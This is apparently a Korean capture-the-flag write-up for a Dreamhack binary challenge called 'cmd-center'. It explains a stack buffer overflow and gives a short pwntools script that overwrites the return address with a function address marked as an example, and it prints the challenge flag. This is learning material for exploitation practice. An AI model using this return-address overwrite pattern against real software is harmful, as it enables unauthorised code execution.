# 문제명
- cmd-center
## 문제 설명

> 문제에서 제공하는 서버나 바이너리의 취약점을 이용하여 플래그를 읽어내는것입니다.

- 문제 URL / 파일 등 접속 정보

## 풀이
-
### 분석

- checksec 명령어를 통해 바이너리에 적용된 보안 메커니즘을 확인합니다.제공된 C언어 소스 코드나 어셈블리 코드를 분석하여 사용자 입력값 저장되는 버퍼의 크기와 함수의 흐름을 파악합니다.objdump나 IDA를 활용하여 주요 함수의 주소를 확인합니다.

### 취약점

- 사용자 입력함수에서 입력값의 길이를 검증하지 않는 부분입니다. 할당된 버퍼의 크기보다 더 큰 데이터를 입력할 수 있어 스택의 Return Address를 덮어 쓸수 있는 구조임을 알수 있었습니다.

### 익스플로잇

- 버퍼의 시작점부터 Return Address까지의 거리를 계산합니다. 시스템 명령어를 실행하는 함수의 주소를 파악하고 더미데이터로 버퍼를 채운뒤 Return Address를 해당 함수의 주소로 변조합니다.

```python
# 
from pwn import *

p = remote('host3.dreamhack.games', 12345) # 실제 포트 번호 입력

payload = b'A' * 0x80      # 버퍼 크기만큼 더미 데이터
payload += b'B' * 0x8       # SFP (Saved Frame Pointer)
payload += p64(0x400607)   # 대상 함수 주소 (예시)

p.sendline(payload)

p.interactive()
```

## 플래그

```
DH{f4c11bf9ea5a1df24175ee4d11da0d16}
```

## 배운 점

- 함수 호출 규약에 따른 스택 프레임 구조를 이해하게 되었고 메모리 상에서 데이터가 Little Endian 방식으로 저장되는 과정을 더 수월하게 이해가 되었습니다. 또한 pwntools를 활용한 자동화된 익스플로잇 스크립트 작성 숙련도를 전보다 조금더 높였습니다.
